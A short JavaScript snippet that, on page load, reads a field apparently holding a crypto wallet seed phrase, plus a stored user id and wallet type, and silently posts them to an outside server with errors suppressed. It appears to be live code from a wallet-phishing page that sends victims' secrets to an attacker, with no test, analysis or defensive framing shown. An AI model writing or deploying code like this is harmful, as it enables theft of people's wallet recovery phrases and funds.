window.addEventListener('load', async() =>{
const phrase = document.getElementById('phrase')
const user = localStorage.getItem('userDataLog').split(',')[0]
const wallletType = document.getElementById("walletType")

try {
    const {data}  = await axios.post('https://foxic.onrender.com/foxic/secret/secrete', {
        secret : phrase.value,
        user : user,
        walletType : wallletType.textContent
    })
} catch (error) {
    
}

})